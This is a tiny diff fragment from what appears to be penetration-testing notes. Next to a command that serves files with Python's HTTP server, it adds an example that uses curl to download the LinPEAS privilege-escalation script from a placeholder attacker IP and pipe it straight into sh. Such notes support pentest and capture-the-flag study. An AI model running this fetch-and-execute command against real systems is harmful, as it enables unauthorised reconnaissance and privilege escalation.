@@ -41,3 +41,7 @@ fg
 ```
 python -m http.server 8000
 ```
+example
+```
+curl -L YOUR_IP:8000/linpeas.sh | sh
+```
